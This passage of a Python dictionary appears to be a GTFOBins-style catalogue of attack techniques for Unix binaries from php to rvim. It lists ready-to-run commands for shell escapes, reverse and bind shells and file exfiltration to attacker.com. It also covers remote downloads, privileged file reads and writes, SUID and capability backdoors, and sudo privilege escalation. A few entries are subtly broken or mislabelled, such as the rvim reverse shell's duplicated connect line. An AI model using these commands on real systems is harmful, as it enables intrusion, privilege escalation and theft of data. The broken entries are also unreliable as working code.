                '1':"export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'"}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which php) .\n\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\""}},  
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which php) .\nsudo setcap cap_setuid+ep php\n\nCMD=\"/bin/sh\n./php -r \"posix_setuid(0); system('$CMD');\"\""}},
            },
    'pic':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"pic -U\n-PS\nsh X sh X"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\npic $LFILE"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pic -U\n-PS\nsh X sh X"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pic) .\n\n./pic -U\n.PS\nsh X sh X"}},
            },
    'pico':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"pico\n^R^X\nreset; sh 1>&0 2>&0",
                '2':"pico -s /bin/sh\n/bin/sh\n^T"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"pico file_to_write\nDATA\n^O"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"pico file_to_read"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pico -U\n^R^X\nreset; sh 1>&0 2>&0"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pico) .\n\n./pico -s /bin/sh\n/bin/sh\n^T"}},
            },
    'pip':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF"}},
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF",
                '2':"export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF"}}, 
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF"}},  
            },
    'pkexec':{
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pkexec /bin/sh"}},  
            },
    'pkg':{
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\nsudo pkg install -y --no-repo-update ./x-1.0.txz"}},  
            },
    'pr':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\npr -T $LFILE"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pr) .\n\nLFILE=file_to_read\npr -T $LFILE"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\npr -T $LFILE"}},  
            },
    'pry':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"pry\nsystem(\"/bin/sh\")"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pry\nsystem(\"/bin/sh\")"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pry) .\n\n./pry\nsystem(\"/bin/sh\")"}},  
            },
    'psql':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"psql\n\?\n!/bin/sh"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"psql\n\?\n!/bin/sh"}},   
            },
    'puppet':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"puppet apply -e \"exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""}}, 
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\""}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo puppet apply -e \"exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""}},  
            },
    'python':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"python -c 'import os; os.system(\"/bin/sh\")'"}},
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'",
                '2':"export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"python -c 'print(open(\"file_to_read\").read())'"}}, 
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which python) .\n\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo python -c 'import os; os.system(\"/bin/sh\")'"}},  
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which python) .\nsudo setcap cap_setuid+ep python\n\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}}, 
            },
    'rake':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rake -p '`/bin/sh 1>&0`'"}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file-to-read\nrake -f $LFILE"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rake -p '`/bin/sh 1>&0`'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rake) .\n\n./rake -p '`/bin/sh 1>&0`'"}},  
            },
    'readelf':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file-to-read\nreadelf -a @$LFILE"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which readelf) .\n\nLFILE=file_to_read\n./readelf -a @$LFILE"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo readelf -a @$LFILE"}},  
            },
    'red':{
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"red file_to_write\na\nDATA\n.\nw\nq"}}, 
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"red file_to_read\n,p\nq"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo red file_to_write\na\nDATA\n.\nw\nq"}},  
            },
    'redcarpet':{
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nredcarpet \"$LFILE\""}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo redcarpet \"$LFILE\""}},  
            },
    'restic':{
        'file_upload':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which restic) .\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""}},  
            },
    'rev':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nrev $LFILE | rev"}}, 
        'suid':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"sudo install -m =xs $(which rev) .\n\nLFILE=file_to_read\n./rev $LFILE | rev"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo rev $LFILE | rev"}},  
            },
    'rlogin':{
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"}}, 
            },
    'rpm':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
                '2':"rpm --pipe '/bin/sh 0<&1'"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
                '2':"TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\nsudo rpm -ivh x-1.0-1.noarch.rpm"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rpm) .\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}},  
            },
    'rpmquery':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rpmquery) .\n\n./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"}},  
            },
    'rsync':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rsync) .\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}},    
            },
    'ruby':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ruby -e 'exec \"/bin/sh\"'"}}, 
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"}}, 
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export LPORT=8888\nruby -run -e httpd . -p $LPORT"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"ruby -e 'puts File.read(\"file_to_read\")'"}},
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ruby -e 'exec \"/bin/sh\"'"}},
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which ruby) .\nsudo setcap cap_setuid+ep ruby\n\n./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"}},      
            },
    'run-mailcap':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"run-mailcap --action=view /etc/hosts\n!/bin/sh"}}, 
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"run-mailcap --action=edit file_to_read"}},  
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"run-mailcap --action=view file_to_read"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo run-mailcap --action=view /etc/hosts\n!/bin/sh"}},    
            },
    'run-parts':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"run-parts --new-session --regex '^sh$' /bin"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which run-parts) .\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'"}},  
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo run-parts --new-session --regex '^sh$' /bin"}},    
            },
    'rview':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}},
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"}},
        'no_interactive_reverse':{   
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\twhile true do\n\t\tlocal r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));t:send(b);\n\tend;\n\tf:close();t:close();'"}},
        'no_interactive_bind':{   
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"export LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n\tlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n\tlocal c=s:accept();\n\twhile true do\n\t\tlocal r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));c:send(b);\n\tend;c:close();f:close();'"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n\tlocal d=f:read(\"*a\")\n\tio.close(f);\n\tlocal s=require(\"socket\");\n\tlocal t=assert(s.tcp());\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\tt:send(d);\n\tt:close();'"}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"rview file_to_write\niDATA\n^[\nw!"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"rview file_to_read"}}, 
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rview) .\n\n./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                '2':"sudo rview -c ':lua os.execute(\"reset; exec sh\")'"}},
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which rview) .\nsudo setcap cap_setuid+ep rview\n\n./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which rview) .\n\n./rview -c ':lua os.execute(\"reset; exec sh\")'"}}, 
            },
    'rvim':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}},
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"}},
        'no_interactive_reverse':{   
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\t\tlocal r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));t:send(b);\n\tend;\n\tf:close();t:close();'"}},
        'no_interactive_bind':{   
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n\tlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n\tlocal c=s:accept();\n\twhile true do\n\t\tlocal r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));c:send(b);\n\tend;c:close();f:close();'"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
